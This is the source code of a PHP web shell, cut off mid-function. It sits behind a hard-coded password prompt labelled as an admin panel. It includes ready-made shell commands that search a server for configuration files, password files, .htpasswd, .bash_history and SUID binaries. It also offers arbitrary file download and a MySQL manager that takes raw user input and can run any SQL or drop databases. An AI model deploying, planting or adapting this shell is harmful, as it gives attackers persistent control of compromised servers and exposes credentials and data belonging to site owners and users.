<?
@session_start();
@set_time_limit(0);
@set_magic_quotes_runtime(0);
error_reporting(E_ALL & ~E_NOTICE);


$create_password = true;
$password = "XDXD";


$fast_commands = "
Show open ports (XDXD) netstat -an | grep LISTEN | grep tcp
last root (XDXD) last root
last (all users) (XDXD) last all
Find all config.php in / (XDXD) find / -type f -name config.php
Find all config.php in . (XDXD) find . -type f -name config.php
Find all admin.php in / (XDXD) find / -type f -name admin.php
Find all admin.php in . (XDXD) find . -type f -name admin.php
Find all config.inc.php in / (XDXD) find / -type f -name config.inc.php
Find all config.inc.php in . (XDXD) find . -type f -name config.inc.php
Find all config.inc in / (XDXD) find / -type f -name config.inc
Find all config.inc in . (XDXD) find . -type f -name config.inc
Find all config.dat in / (XDXD) find / -type f -name config.dat
Find all config.dat in . (XDXD) find . -type f -name config.dat
Find all config* in / (XDXD) find / -type f -name config*
Find all config* in . (XDXD) find . -type f -name config*
Find all pass* in / (XDXD) find / -type f -name pass*
Find all pass* in . (XDXD) find . -type f -name pass*
Find all .bash_history in / (XDXD) find / -type f -name .bash_history
Find all .bash_history in . (XDXD) find . -type f -name .bash_history
Find all .htpasswd  in / (XDXD) find / -type f -name .htpasswd
Find all .htpasswd  in . (XDXD) find . -type f -name .htpasswd
Find all writable dirs/files in / (XDXD) find / -perm -2 -ls
Find all writable dirs/files in . (XDXD) find . -perm -2 -ls
Find all suid files in / (XDXD) find / -type f -perm -04000 -ls
Find all suid files in . (XDXD) find . -type f -perm -04000 -ls
Find all sgid files in / (XDXD) find / -type f -perm -02000 -ls
Find all sgid files in . (XDXD) find . -type f -perm -02000 -ls
Find all .fetchmailrc files in / (XDXD) find / -type f -name .fetchmailrc
Find all .fetchmailrc files in . (XDXD) find . -type f -name .fetchmailrc
OS Version? (XDXD) sysctl -a | grep version
Kernel version? (XDXD) cat /proc/version
cat syslog.conf (XDXD) cat /etc/syslog.conf
Cat - Message of the day (XDXD) cat /etc/motd
Cat hosts (XDXD) cat /etc/hosts
Distrib name (XDXD) cat /etc/issue.net
Distrib name (2) (XDXD) cat /etc/*-realise
Display all process - wide output (XDXD) ps auxw
Display all your process (XDXD) ps ux
Interfaces (XDXD) ifconfig
CPU? (XDXD) cat /proc/cpuinfo
RAM (XDXD) free -m
HDD space (XDXD) df -h
List of Attributes (XDXD) lsattr -a
Mount options (XDXD) cat /etc/fstab
Is cURL iXDXDalled? (XDXD) which curl
Is wGET iXDXDalled? (XDXD) which wget
Is lynx iXDXDalled? (XDXD) which lynx
Is links iXDXDalled? (XDXD) which links
Is fetch iXDXDalled? (XDXD) which fetch
Is GET iXDXDalled? (XDXD) which GET
Is perl iXDXDalled? (XDXD) which perl
Where is apache (XDXD) whereis apache
Where is perl (XDXD) whereis perl
locate proftpd.conf (XDXD) locate proftpd.conf
locate httpd.conf (XDXD) locate httpd.conf
locate my.conf (XDXD) locate my.conf
locate psybnc.conf (XDXD) locate psybnc.conf
";




$fast_commands_win = "
OS Version (XDXD) ver
Tasklist  (XDXD) tasklist
Attributes in . (XDXD) attrib
Show open ports (XDXD) netstat -an
";

$pass=$_POST['pass'];
if($pass==$password){
$_SESSION['XDXD']="$pass";
}
if ($_SERVER["HTTP_CLIENT_IP"]) $ip = $_SERVER["HTTP_CLIENT_IP"];
else if($_SERVER["HTTP_X_FORWARDED_FOR"]) $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if($_SERVER["REMOTE_ADDR"]) $ip = $_SERVER["REMOTE_ADDR"];
else $ip = $_SERVER['REMOTE_ADDR'];
$ip=htmlspecialchars($ip);

if($create_password==true){

if(!isset($_SESSION['XDXD']) or $_SESSION['XDXD']!=$password){
die("
<center>
<table width=100 bgcolor=#D7FFA8 border=1 bordercolor=black><tr><td>
<font size=1 face=verdana><center>
</center>
<form method=post>
Admin Pannel:<br>
<input type=password name=pass size=30 tabindex=1>
</form>
</table>
");}

}
$d=$_GET['d'];

function adds($editf){
#if(get_magic_quotes_gpc()==0){
$editf=addslashes($editf);
#}
return $editf;
}
function adds2($editf){
if(get_magic_quotes_gpc()==0){
$editf=addslashes($editf);
}
return $editf;
}

$f   = "XDXD_sql.txt";
$f_d = $_GET['f_d'];

if($_GET['download']){
$download=$_GET['download'];
header("Content-disposition: attachment; filename=\"$download\";");
readfile("$d/$download");
exit;}

if(@$_GET['p']=="sql"){
echo "<center>";
@$HOSTNAME= $_GET[host];
@$action= $_GET[action];
@$PASSWORD= $_GET[PASSWORD];

extract($_GET);

function logon() {
  global $PHP_SELF;

  echo "<table width=100% height=100%><tr><td><center>\n";
  echo "<table cellpadding=2><tr><td bgcolor=#a4a260><center>\n";
  echo "<table cellpadding=20><tr><td bgcolor=#ffffff><center>\n";
  echo "<h1>MySQL DATABASE MANAGER</h1>\n";
  echo "<form action='$PHP_SELF'>\n";
  echo "<input type=hidden name=p value=sql>\n";
  echo "<input type=hidden name=action value=logon_submit>\n";
  echo "<table cellpadding=5 cellspacing=1>\n";
  if(!empty($_SESSION['sqlhost']))$msqlhost=$_SESSION['sqlhost'];
  else
  $msqlhost="localhost";
  if(!empty($_SESSION['sqlusername']))$msqlusername=$_SESSION['sqlusername'];
  else
  $msqlusername="root";
  if(!empty($_SESSION['sqlpassword']))$msqlpassword=$_SESSION['sqlpassword'];
  else
  $msqlpassword="";
  echo "<tr><td>Username </td><td> <input type=text name=sqlusername value=$msqlusername></td></tr>\n";
  echo "<tr><td>Password </td><td> <input type=password name=sqlpassword value=$msqlpassword></td></tr>\n";
  echo "<tr><td>Host </td><td> <input type=text name=msqlhost value=$msqlhost></td></tr>\n";
  echo "</table><p>\n";
  echo "<input type=submit value='Enter'>\n";
  echo "<input type=button value='Back' onclick=javascript:window.location='$PHP_SELF';><br>\n";
  echo "</form>\n";
  echo "</center></td></tr></table>\n";
  echo "</center></td></tr></table>\n";
  echo "</center></td></tr></table>\n";
}

function logon_submit() {
  global $sqlusername, $sqlpassword,$sqlhost, $PHP_SELF;
  session_start();
  $_SESSION['sqlusername'] = $sqlusername;
  $_SESSION['sqlpassword'] = $sqlpassword;
  $_SESSION['sqlhost'] = $sqlhost;
  echo "<html>";
  echo "<head>";
  echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=$PHP_SELF?p=sql&action=listDBs'>";
  echo "</head>";
  echo "</html>";
}

function echoQueryResult() {
  global $queryStr, $errMsg;

  if( $errMsg == "" ) $errMsg = "Success";
  if( $queryStr != "" ) {
    echo "<table cellpadding=5>\n";
    echo "<tr><td>Query</td><td>$queryStr</td></tr>\n";
    echo "<tr><td>Result</td><td>$errMsg</td></tr>\n";
    echo "</table><p>\n";
  }
}

function listDatabases() {
  global $mysqlHandle, $PHP_SELF;

  echo "<h1>Database List</h1>\n";
  echo "<hr>";
  echo "<table cellspacing=1 cellpadding=5>\n";

  $pDB = mysql_list_dbs( $mysqlHandle );
  $num = mysql_num_rows( $pDB );
  for( $i = 0; $i < $num; $i++ ) {
    $dbname = mysql_dbname( $pDB, $i );
    echo "<tr>\n";
    echo "<td>$dbname</td>\n";
    echo "<td><a href='$PHP_SELF?p=sql&action=listTables&dbname=$dbname'>Table</a></td>\n";
    echo "<td><a href='$PHP_SELF?p=sql&action=dropDB&dbname=$dbname' onClick=\"return confirm('drop Database \'$dbname\'?')\">drop</a></td>\n";
    echo "</tr>\n";
  }
  echo "</table>\n";
}

function dropDatabase() {
  global $mysqlHandle, $dbname, $PHP_SELF;

  mysql_query("drop database $dbname", $mysqlHandle );
  listDatabases();
}

function listTables() {
  global $mysqlHandle, $dbname, $PHP_SELF;

  echoQueryResult();

  echo "<h1> DataBase: $dbname Table List</h1>\n";
  echo "<form action='$PHP_SELF'>\n";
   echo "<input type=hidden name=p value=sql>\n";
  echo "<input type=hidden name=action value=query>\n";
  echo "<input type=hidden name=dbname value=$dbname>\n";
  echo "<input type=text size=80 name=queryStr>\n";
  echo "<input type=submit value='Query'>\n";
  echo "</form>\n";
  echo "<p><hr>\n";

  $pTable = mysql_list_tables( $dbname );

  if( $pTable == 0 ) {
    $msg = mysql_error();
    echo "<h3>Error : $msg</h3><p>\n";
    return;
  }
  $num = mysql_num_rows( $pTable );

  echo "<table cellspacing=1 cellpadding=5>\n";

  for( $i = 0; $i < $num; $i++ ) {
    $tablename = mysql_tablename( $pTable, $i );

    echo "<tr>\n";
    echo "<td>\n";
    echo "$tablename\n";
    echo "</td>\n";
    echo "<td>\n";
    echo "<a href='$PHP_SELF?p=sql&action=viewSchema&dbname=$dbname&tablename=$tablename'>Schema</a>\n";
    echo "</td>\n";
    echo "<td>\n";
    echo "<a href='$PHP_SELF?p=sql&action=viewData&dbname=$dbname&tablename=$tablename'>Data</a>\n";
    echo "</td>\n";
    echo "<td>\n";
    echo "<a href='$PHP_SELF?p=sql&action=dropTable&dbname=$dbname&tablename=$tablename' onClick=\"return confirm('drop Database \'$dbname\'?')\">drop</a>\n";
    echo "</td>\n";
    echo "</tr>\n";
  }

  echo "</table>";
}

function dropTable() {
  global $mysqlHandle, $dbname, $tablename, $PHP_SELF, $queryStr, $errMsg;

  $queryStr = "drop TABLE $tablename";
  mysql_select_db( $dbname, $mysqlHandle );
  mysql_query( $queryStr, $mysqlHandle );
  $errMsg = mysql_error();

  listTables();
}

function viewSchema() {
  global $mysqlHandle, $dbname, $tablename, $PHP_SELF, $queryStr, $errMsg;

  echo "<h1>Table Schema</h1>\n";
  echo "<p class=location>$dbname &gt; $tablename</p>\n";

  echoQueryResult();

  echo "<a href='$PHP_SELF?p=sql&action=addField&dbname=$dbname&tablename=$tablename'>Add Field</a> | \n";
  echo "<a href='$PHP_SELF?p=sql&action=viewData&dbname=$dbname&tablename=$tablename'>View Data</a>\n";
  echo "<hr>\n";

  $pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
  $num = mysql_num_rows( $pResult );

  echo "<table cellspacing=1 cellpadding=5>\n";
  echo "<tr>\n";
  echo "<th>Field</th>\n";
  echo "<th>Type</th>\n";
  echo "<th>Null</th>\n";
  echo "<th>Key</th>\n";
  echo "<th>Default</th>\n";
  echo "<th>Extra</th>\n";
  echo "<th colspan=2>Action</th>\n";
  echo "</tr>\n";

  for( $i = 0; $i < $num; $i++ ) {
    $field = mysql_fetch_array( $pResult );
    echo "<tr>\n";
    echo "<td>".$field["Field"]."</td>\n";
    echo "<td>".$field["Type"]."</td>\n";
    echo "<td>".$field["Null"]."</td>\n";
    echo "<td>".$field["Key"]."</td>\n";
    echo "<td>".$field["Default"]."</td>\n";
    echo "<td>".$field["Extra"]."</td>\n";
    $fieldname = $field["Field"];
    echo "<td><a href='$PHP_SELF?p=sql&action=editField&dbname=$dbname&tablename=$tablename&fieldname=$fieldname'>Edit</a></td>\n";
    echo "<td><a href='$PHP_SELF?p=sql&action=dropField&dbname=$dbname&tablename=$tablename&fieldname=$fieldname' onClick=\"return confirm('drop Field \'$fieldname\'?')\">drop</a></td>\n";
    echo "</tr>\n";
  }
  echo "</table>\n";
}

function manageField( $cmd ) {
  global $mysqlHandle, $dbname, $tablename, $fieldname, $PHP_SELF;

  if( $cmd == "add" )
    echo "<h1>Add Field</h1>\n";
  else if( $cmd == "edit" ) {
    echo "<h1>Edit Field</h1>\n";
    $pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
    $num = mysql_num_rows( $pResult );
    for( $i = 0; $i < $num; $i++ ) {
      $field = mysql_fetch_array( $pResult );
      if( $field["Field"] == $fieldname ) {
        $fieldtype = $field["Type"];
        $fieldkey = $field["Key"];
        $fieldextra = $field["Extra"];
        $fieldnull = $field["Null"];
        $fielddefault = $field["Default"];
        break;
      }
    }
    $type = strtok( $fieldtype, " (,)\n" );
    if( strpos( $fieldtype, "(" ) ) {
      $M = strtok( " (,)\n" );
      if( strpos( $fieldtype, "," ) )
        $D = strtok( " (,)\n" );
    }
  }

  echo "<p class=location>$dbname &gt; $tablename</p>\n";
  echo "<form action=$PHP_SELF>\n";

  if( $cmd == "add" )
    echo "<input type=hidden name=action value=addField_submit>\n";
  else if( $cmd == "edit" ) {
    echo "<input type=hidden name=action value=editField_submit>\n";
    echo "<input type=hidden name=old_name value=$fieldname>\n";
  }
  echo "<input type=hidden name=dbname value=$dbname>\n";
  echo "<input type=hidden name=tablename value=$tablename>\n";

  echo "<h3>Name</h3>\n";
  echo "<input type=text name=name value=$fieldname><p>\n";
?>
<h3>Type</h3>

<font size=2>
* `M' indicates the maximum display size.<br>
* `D' applies to floating-point types and indicates the number of digits following the decimal point.<br>
</font>

<table>
<tr>
<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofill</th><th>binary</th>
</tr>
<tr>
<td><input type=radio name=type value="TINYINT" <?php if( $type == "tinyint" ) echo "checked";?>>TINYINT (-128 ~ 127)</td>
<td align=center>O</td>
<td>&nbsp</td>
<td align=center>O</td>
<td align=center>O</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="SMALLINT" <?php if( $type == "smallint" ) echo "checked";?>>SMALLINT (-32768 ~ 32767)</td>
<td align=center>O</td>
<td>&nbsp</td>
<td align=center>O</td>
<td align=center>O</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="MEDIUMINT" <?php if( $type == "mediumint" ) echo "checked";?>>MEDIUMINT (-8388608 ~ 8388607)</td>
<td align=center>O</td>
<td>&nbsp</td>
<td align=center>O</td>
<td align=center>O</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="INT" <?php if( $type == "int" ) echo "checked";?>>INT (-2147483648 ~ 2147483647)</td>
<td align=center>O</td>
<td>&nbsp</td>
<td align=center>O</td>
<td align=center>O</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="BIGINT" <?php if( $type == "bigint" ) echo "checked";?>>BIGINT (-9223372036854775808 ~ 9223372036854775807)</td>
<td align=center>O</td>
<td>&nbsp</td>
<td align=center>O</td>
<td align=center>O</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="FLOAT" <?php if( $type == "float" ) echo "checked";?>>FLOAT</td>
<td align=center>O</td>
<td align=center>O</td>
<td>&nbsp</td>
<td align=center>O</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="DOUBLE" <?php if( $type == "double" ) echo "checked";?>>DOUBLE</td>
<td align=center>O</td>
<td align=center>O</td>
<td>&nbsp</td>
<td align=center>O</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="DECIMAL" <?php if( $type == "decimal" ) echo "checked";?>>DECIMAL(NUMERIC)</td>
<td align=center>O</td>
<td align=center>O</td>
<td>&nbsp</td>
<td align=center>O</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="DATE" <?php if( $type == "date" ) echo "checked";?>>DATE (1000-01-01 ~ 9999-12-31, YYYY-MM-DD)</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="DATETIME" <?php if( $type == "datetime" ) echo "checked";?>>DATETIME (1000-01-01 00:00:00 ~ 9999-12-31 23:59:59, YYYY-MM-DD HH:MM:SS)</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="TIMESTAMP" <?php if( $type == "timestamp" ) echo "checked";?>>TIMESTAMP (1970-01-01 00:00:00 ~ 2106..., YYYYMMDD[HH[MM[SS]]])</td>
<td align=center>O</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="TIME" <?php if( $type == "time" ) echo "checked";?>>TIME (-838:59:59 ~ 838:59:59, HH:MM:SS)</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="YEAR" <?php if( $type == "year" ) echo "checked";?>>YEAR (1901 ~ 2155, 0000, YYYY)</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="CHAR" <?php if( $type == "char" ) echo "checked";?>>CHAR</td>
<td align=center>O</td>
<td>&nbsp</td>
<td>&nbsp</td>

<td>&nbsp</td>
<td align=center>O</td>
</tr>
<tr>
<td><input type=radio name=type value="VARCHAR" <?php if( $type == "varchar" ) echo "checked";?>>VARCHAR</td>
<td align=center>O</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td align=center>O</td>
</tr>
<tr>
<td><input type=radio name=type value="TINYTEXT" <?php if( $type == "tinytext" ) echo "checked";?>>TINYTEXT (0 ~ 255)</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="TEXT" <?php if( $type == "text" ) echo "checked";?>>TEXT (0 ~ 65535)</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="MEDIUMTEXT" <?php if( $type == "mediumtext" ) echo "checked";?>>MEDIUMTEXT (0 ~ 16777215)</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="LONGTEXT" <?php if( $type == "longtext" ) echo "checked";?>>LONGTEXT (0 ~ 4294967295)</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="TINYBLOB" <?php if( $type == "tinyblob" ) echo "checked";?>>TINYBLOB (0 ~ 255)</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="BLOB" <?php if( $type == "blob" ) echo "checked";?>>BLOB (0 ~ 65535)</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="MEDIUMBLOB" <?php if( $type == "mediumblob" ) echo "checked";?>>MEDIUMBLOB (0 ~ 16777215)</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
</tr>
<tr>
<td><input type=radio name=type value="LONGBLOB" <?php if( $type == "longblob" ) echo "checked";?>>LONGBLOB (0 ~ 4294967295)</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
<td>&nbsp</td>
</tr>

</table>
<table>
<tr><th>M</th><th>D</th><th>unsigned</th><th>zerofill</th><th>binary</th></tr>
<tr>
<td align=center><input type=text size=4 name=M <?php if( $M != "" ) echo "value=$M";?>></td>
<td align=center><input type=text size=4 name=D <?php if( $D != "" ) echo "value=$D";?>></td>
<td align=center><input type=checkbox name=unsigned value="UNSIGNED" <?php if( strpos( $fieldtype, "unsigned" ) ) echo "checked";?>></td>
<td align=center><input type=checkbox name=zerofill value="ZEROFILL" <?php if( strpos( $fieldtype, "zerofill" ) ) echo "checked";?>></td>
<td align=center><input type=checkbox name=binary value="BINARY" <?php if( strpos( $fieldtype, "binary" ) ) echo "checked";?>></td>
</tr>
</table>


<h3>Flags</h3>
<table>
<tr><th>not null</th><th>default value</th><th>auto increment</th><th>primary key</th></tr>
<tr>
<td align=center><input type=checkbox name=not_null value="NOT NULL" <?php if( $fieldnull != "YES" ) echo "checked";?>></td>
<td align=center><input type=text name=default_value <?php if( $fielddefault != "" ) echo "value=$fielddefault";?>></td>
<td align=center><input type=checkbox name=auto_increment value="AUTO_INCREMENT" <?php if( $fieldextra == "auto_increment" ) echo "checked";?>></td>
<td align=center><input type=checkbox name=primary_key value="PRIMARY KEY" <?php if( $fieldkey == "PRI" ) echo "checked";?>></td>
</tr>
</table>

<p>

<?php
  if( $cmd == "add" )
    echo "<input type=submit value='Add Field'>\n";
  else if( $cmd == "edit" )
  echo "<input type=hidden name=p value=sql>\n";
    echo "<input type=submit value='Edit Field'>\n";
  echo "<input type=button value=Cancel onClick='history.back()'>\n";
  echo "</form>\n";
}

function manageField_submit( $cmd ) {
  global $mysqlHandle, $dbname, $tablename, $old_name, $name, $type, $PHP_SELF, $queryStr, $errMsg,
    $M, $D, $unsigned, $zerofill, $binary, $not_null, $default_value, $auto_increment, $primary_key;

  if( $cmd == "add" )
    $queryStr = "alter TABLE $tablename ADD $name ";
  else if( $cmd == "edit" )
    $queryStr = "alter TABLE $tablename CHANGE $old_name $name ";

  if( $M != "" )
    if( $D != "" )
      $queryStr .= "$type($M,$D) ";
    else
      $queryStr .= "$type($M) ";
  else
    $queryStr .= "$type ";

  $queryStr .= "$unsigned $zerofill $binary ";

  if( $default_value != "" )
    $queryStr .= "DEFAULT '$default_value' ";

  $queryStr .= "$not_null $auto_increment $primary_key";

  mysql_select_db( $dbname, $mysqlHandle );
  mysql_query( $queryStr, $mysqlHandle );
  $errMsg = mysql_error();

  viewSchema();
}

function dropField() {
  global $mysqlHandle, $dbname, $tablename, $fieldname, $PHP_SELF, $queryStr, $errMsg;

  $queryStr = "alter TABLE $tablename drop COLUMN $fieldname";
  mysql_select_db( $dbname, $mysqlHandle );
  mysql_query( $queryStr , $mysqlHandle );
  $errMsg = mysql_error();

  viewSchema();
}

function viewData( $queryStr ) {
  global $mysqlHandle, $dbname, $tablename, $PHP_SELF, $errMsg;

  if( $tablename != "" )
   echo "<h1>DataBase:$dbname  Table:$tablename</h1>\n";
  else
	echo "<h1>DataBase $dbname </h1>\n";

  echoQueryResult();

  $queryStr = stripslashes( $queryStr );
  if( $queryStr == "" ) {
    $queryStr = "select * FROM $tablename";
    echo "<a href='$PHP_SELF?p=sql&action=addData&dbname=$dbname&tablename=$tablename'>Add Data</a> | \n";
    echo "<a href='$PHP_SELF?p=sql&action=viewSchema&dbname=$dbname&tablename=$tablename'>Schema</a>\n";
  } else {
    echo "Query : $queryStr<br>";
  }

  $pResult = mysql_db_query( $dbname, $queryStr );
  $errMsg = mysql_error();

  $GLOBALS[queryStr] = $queryStr;

  echo "<hr>\n";
  if( $errMsg != "" )
    echoQueryResult();

  if( $pResult == false ) return;
  if( $pResult == 1 ) {
    echo "<h2>Success!</h2><p>";
    return;
  }

  $row = mysql_num_rows( $pResult );
  $col = mysql_num_fields( $pResult );

  echo "<table cellspacing=1 cellpadding=2>\n";
  echo "<tr>\n";
  for( $i = 0; $i < $col; $i++ ) {
    $field = mysql_fetch_field( $pResult, $i );
    echo "<th>".$field->name."</th>\n";
  }
  echo "<th colspan=2>Action</th>\n";
  echo "</tr>\n";

  for( $i = 0; $i < $row; $i++ ) {
    echo "<tr>\n";
    $rowArray = mysql_fetch_row( $pResult );
    $key = "";
    for( $j = 0; $j < $col; $j++ ) {
      $data = $rowArray[$j];

      $field = mysql_fetch_field( $pResult, $j );
      if( $field->primary_key == 1 )
        $key .= "&" . $field->name . "=" . $data;

      if( strlen( $data ) > 20 )
        $data = substr( $data, 0, 20 ) . "...";
      $data = htmlspecialchars( $data );
      echo "<td>\n";
      echo "$data\n";
      echo "</td>\n";
    }

    if( $key == "" )
      echo "<td colspan=2>no Key</td>\n";
    else {
      echo "<td><a href='$PHP_SELF?p=sql&action=editData&dbname=$dbname&tablename=$tablename$key'>Edit</a></td>\n";
      echo "<td><a href='$PHP_SELF?p=sql&action=deleteData&dbname=$dbname&tablename=$tablename$key' onClick=\"return confirm('delete Row?')\">delete</a></td>\n";
    }
    echo "</tr>\n";
  }

  echo "</table>\n";
}

function manageData( $cmd ) {
  global $mysqlHandle, $dbname, $tablename, $PHP_SELF;

  if( $cmd == "add" )
    echo "<h1>Add Data</h1>\n";
  else if( $cmd == "edit" ) {
    echo "<h1>Edit Data</h1>\n";
    $pResult = mysql_list_fields( $dbname, $tablename );
    $num = mysql_num_fields( $pResult );

    $key = "";
    for( $i = 0; $i < $num; $i++ ) {
      $field = mysql_fetch_field( $pResult, $i );
      if( $field->primary_key == 1 )
        if( $field->numeric == 1 )
          $key .= $field->name . "=" . $GLOBALS[$field->name] . " AND ";
        else
          $key .= $field->name . "='" . $GLOBALS[$field->name] . "' AND ";
    }
    $key = substr( $key, 0, strlen($key)-4 );

    mysql_select_db( $dbname, $mysqlHandle );
    $pResult = mysql_query( $queryStr = "select * FROM $tablename where $key", $mysqlHandle );
    $data = mysql_fetch_array( $pResult );
  }

  echo "<p class=location>$dbname &gt; $tablename</p>\n";

  if( $cmd == "add" )
    echo "<form action=?p=sql&action=addDatasubmit method=post>\n";
  else if( $cmd == "edit" )
  echo "<form action=?p=sql&action=EditDatasubmit method=post>\n";
  echo "<input type=hidden name=dbname value=$dbname>\n";
  echo "<input type=hidden name=tablename value=$tablename>\n";
  echo "<table cellspacing=1 cellpadding=2>\n";
  echo "<tr>\n";
  echo "<th>Name</th>\n";
  echo "<th>Type</th>\n";
  echo "<th>Function</th>\n";
  echo "<th>Data</th>\n";
  echo "</tr>\n";

  $pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
  $num = mysql_num_rows( $pResult );

  $pResultLen = mysql_list_fields( $dbname, $tablename );

  for( $i = 0; $i < $num; $i++ ) {
    $field = mysql_fetch_array( $pResult );
    $fieldname = $field["Field"];
    $len = mysql_field_len( $pResultLen, $i );

    echo "<tr>";
    echo "<td>$fieldname</td>";
    echo "<td>".$field["Type"]."</td>";
    echo "<td>\n";
    echo "<select name=${fieldname}_function>\n";
    echo "<option>\n";
    echo "<option>ASCII\n";
    echo "<option>CHAR\n";
    echo "<option>SOUNDEX\n";
    echo "<option>CURDATE\n";
    echo "<option>CURTIME\n";
    echo "<option>FROM_DAYS\n";
    echo "<option>FROM_UNIXTIME\n";
    echo "<option>NOW\n";
    echo "<option>PASSWORD\n";
    echo "<option>PERIOD_ADD\n";
    echo "<option>PERIOD_DIFF\n";
    echo "<option>TO_DAYS\n";
    echo "<option>USER\n";
    echo "<option>WEEKDAY\n";
    echo "<option>RAND\n";
    echo "</select>\n";
    echo "</td>\n";
    $value = htmlspecialchars($data[$i]);
    if( $cmd == "add" ) {
      if( $len < 40 )
        echo "<td><input type=text size=40 maxlength=$len name=$fieldname></td>\n";
      else
        echo "<td><textarea cols=40 rows=3 maxlength=$len name=$fieldname></textarea>\n";
    } else if( $cmd == "edit" ) {
      if( $len < 40 )
        echo "<td><input type=text size=40 maxlength=$len name=$fieldname value=$value></td>\n";
      else
        echo "<td><textarea cols=40 rows=3 maxlength=$len name=$fieldname>$value</textarea>\n";
    }
    echo "</tr>";
  }
  echo "</table><p>\n";
  if( $cmd == "add" )
    echo "<input type=submit value='Add Data'>\n";
  else if( $cmd == "edit" )
    echo "<input type=submit value='Edit Data'>\n";
  echo "<input type=button value='Cancel' onClick='history.back()'>\n";
  echo "</form>\n";
}

function manageData_submit( $cmd ) {
  global $mysqlHandle, $dbname, $tablename, $fieldname, $PHP_SELF, $queryStr, $errMsg;

  $pResult = mysql_list_fields( $dbname, $tablename );
  $num = mysql_num_fields( $pResult );

  mysql_select_db( $dbname, $mysqlHandle );
  if( $cmd == "add" )
    $queryStr = "insert INTO $tablename VALUES (";
  else if( $cmd == "edit" )
    $queryStr = "REPLACE INTO $tablename VALUES (";
  for( $i = 0; $i < $num-1; $i++ ) {
    $field = mysql_fetch_field( $pResult );
    $func = $GLOBALS[$field->name."_function"];
    if( $func != "" )
      $queryStr .= " $func(";
    if( $field->numeric == 1 ) {
      $queryStr .= $GLOBALS[$field->name];
      if( $func != "" )
        $queryStr .= "),";
      else
        $queryStr .= ",";
    } else {
      $queryStr .= "'" . $GLOBALS[$field->name];
      if( $func != "" )
        $queryStr .= "'),";
      else
        $queryStr .= "',";
    }
  }
  $field = mysql_fetch_field( $pResult );
  if( $field->numeric == 1 )
    $queryStr .= $GLOBALS[$field->name] . ")";
  else
    $queryStr .= "'" . $GLOBALS[$field->name] . "')";

  mysql_query( $queryStr , $mysqlHandle );
  $errMsg = mysql_error();

  viewData( "" );
}

function deleteData() {
  global $mysqlHandle, $dbname, $tablename, $fieldname, $PHP_SELF, $queryStr, $errMsg;

  $pResult = mysql_list_fields( $dbname, $tablename );
  $num = mysql_num_fields( $pResult );

  $key = "";
  for( $i = 0; $i < $num; $i++ ) {
    $field = mysql_fetch_field( $pResult, $i );
    if( $field->primary_key == 1 )
      if( $field->numeric == 1 )
        $key .= $field->name . "=" . $GLOBALS[$field->name] . " AND ";
      else
        $key .= $field->name . "='" . $GLOBALS[$field->name] . "' AND ";
  }
  $key = substr( $key, 0, strlen($key)-4 );

  mysql_select_db( $dbname, $mysqlHandle );
  $queryStr = "delete FROM $tablename where $key";
  mysql_query( $queryStr, $mysqlHandle );
  $errMsg = mysql_error();

  viewData( "" );
}

function header_html() {
  global $PHP_SELF;
?>
<html>
<head>
<title>Mysql DataBase Manager</title>
<style type="text/css">
<!--
p.location {
  color: #11bb33;
  font-size: small;
}
h1 {
  color: #A4A260;
}
th {
  background-color: #BDBE42;
  color: #FFFFFF;
  font-size: x-small;
}
td {
  background-color: #DEDFA5;
  font-size: x-small;
}
a {
  text-decoration:none;
  color: #848200;
  font-size:x-small;
}
a:link {
}
a:hover {
  background-color:#EEEFD5;
  color:#646200;
  text-decoration:none
}
//-->
</style>
</head>
<body>
<?php
}

function footer_html() {
  global $mysqlHandle, $dbname, $tablename, $PHP_SELF;
?>
<font size=2>
